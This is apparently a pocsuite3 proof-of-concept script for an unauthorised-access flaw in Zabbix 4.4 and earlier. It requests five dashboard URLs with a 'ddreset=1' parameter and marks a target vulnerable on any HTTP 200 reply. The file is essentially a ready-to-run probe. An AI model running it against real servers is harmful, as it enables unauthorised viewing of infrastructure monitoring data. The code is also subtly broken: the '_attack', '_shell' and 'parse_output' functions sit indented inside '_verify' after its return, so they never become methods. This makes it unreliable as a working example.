"""
作者 charis
时间 2023-1-16
"""
import time
import json
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '9'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-16'
    updateDate = '2023-01-16'
    references = ['https://www.cnblogs.com/qtzd/p/14971749.html']
    name = 'Zabbix 未授权访问漏洞'
    appPowerLink = 'https://www.zabbix.com/'
    appName = 'Zabbix'
    appVersion = 'Zabbix <= 4.4'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    # 定义检查方法
    def _check(self, url):

        payloads = [
            r"/zabbix.php?action=dashboard.view&ddreset=1",
            r"/zabbix.php?action=problem.view&ddreset=1",
            r"/overview.php?ddreset=1",
            r"/srv_status.php?ddreset=1",
            r"/latest.php?ddreset=1"
        ]

        for payload in payloads:
            vul_url = url + payload

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            try:
                r = requests.get(vul_url, headers=headers)
                if r.status_code == 200:
                    return url, payload, url + payload

            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
            result['VerifyInfo']['Vulnerability-address'] = p[2]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


